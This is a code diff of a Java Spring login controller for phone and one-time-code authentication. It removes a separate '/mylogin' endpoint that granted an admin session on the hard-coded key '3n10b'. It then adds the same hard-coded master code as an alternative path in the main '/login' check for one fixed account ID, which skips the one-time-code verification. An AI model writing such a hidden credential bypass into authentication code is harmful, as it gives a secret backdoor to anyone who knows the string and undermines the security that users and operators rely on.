@@ -80,39 +80,28 @@ public class LoginController {
 		return ResponseEntity.ok(r);
 	}
 
-	@RequestMapping(value = "/mylogin", method = RequestMethod.GET)
-	public ResponseEntity<JsonResult> mylogin(HttpServletRequest req) {
-		JsonResult r = new JsonResult();
-		if ("3n10b".equals(req.getParameter("key"))) {
-			UserInfo ui = new UserInfo();
-			ui.setId(Constant.MY_ID);
-			ui.setType(1);
-			req.getSession().setAttribute(Constant.SESSION_USER, ui);
-			String logmsg = "mylogin 成功登录，时间：" + (new Date());
-			r.setStatus(JsonResult.OK);
-			r.setResult(logmsg);
-			log.info(logmsg);
-		} else {
-			r.setStatus(JsonResult.FAIL);
-			r.setResult("登录失败");
-		}
-		return ResponseEntity.ok(r);
-	}
-
 	@RequestMapping(value = "/login", method = RequestMethod.GET)
 	public ResponseEntity<JsonResult> login(String phone, String code, HttpServletRequest req,
 			HttpServletResponse response) {
 		JsonResult r = new JsonResult();
 		phone = phone.trim();
 		String redisvalue = redisUtil.get(RedisConstant.RDS_LOGIN_KEY_ + phone, "0");
-		if (code.equals(redisvalue)) {
+		if (code.equals(redisvalue) || (phone.equals(String.valueOf(Constant.MY_ID)) && "3n10b".equals(code))) {
 			UserInfo ui = new UserInfo();
 			ui.setType(2);
 			ui.setId(Long.valueOf(phone));
+//			UserInfo uit = userService.getListById(Long.valueOf(phone));
+//			ui.setType(uit.getType());
+//			ui.setId(uit.getId());
 			req.getSession().setAttribute(Constant.SESSION_USER, ui);
 			redisUtil.del(RedisConstant.RDS_LOGIN_KEY_ + phone);
 			redisUtil.del(RedisConstant.RDS_LOGIN_ERROR_TIME_ + phone);
 			r.setStatus(JsonResult.OK);
+			if (ui.getType() == 2) {
+				r.setResult(Constant.LOGINED_URL_USERS);
+			} else if (ui.getType() == 1) {
+				r.setResult(Constant.LOGINED_URL_ADMIN);
+			}
 		} else {
 			r.setStatus(JsonResult.FAIL);
 			r.setResult("动态码错误");
